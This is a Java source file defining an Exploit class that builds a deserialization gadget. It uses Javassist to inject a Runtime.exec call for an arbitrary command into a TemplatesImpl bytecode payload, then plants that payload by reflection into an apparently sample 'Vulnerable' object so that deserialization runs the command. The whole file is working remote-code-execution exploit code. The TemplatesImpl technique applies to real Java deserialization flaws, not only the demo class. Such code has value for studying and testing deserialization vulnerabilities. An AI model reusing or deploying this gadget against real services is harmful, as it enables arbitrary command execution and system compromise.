package com.ttulka.security;

import java.io.Serializable;
import java.lang.reflect.Field;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.ttulka.security.sample.Vulnerable;

import javassist.ClassPool;
import javassist.CtClass;

public class Exploit implements Serializable {

    private static final long serialVersionUID = 1L;

    private final String cmd;

    public Exploit(String cmd) {
        this.cmd = cmd;
    }

    public Vulnerable exploited(Vulnerable vulnerable) throws Exception {
        TemplatesImpl exploit = createTemplatesImpl(cmd);
        setFieldValue(vulnerable, "object", exploit);

        // TemplatesImpl#newTransformer() must be called to execute exploit
        // it's called from inside TemplatesImpl#getOutputProperties() as well
        setFieldValue(vulnerable, "property", "outputProperties");

        return vulnerable;
    }

    public TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(StubTransletPayload.class.getName());

        // run command in static initializer
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                     command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                     "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("com.ttulka.Exploit" + System.nanoTime()); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)

        // inject class bytes into instance
        byte[] classBytes = clazz.toBytecode();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});

        // required to make TemplatesImpl happy
        setFieldValue(templates, "_name", "Exploit");
        setFieldValue(templates, "_tfactory", TransformerFactoryImpl.class.newInstance());
        return templates;
    }

    void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = 1L;

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }
}
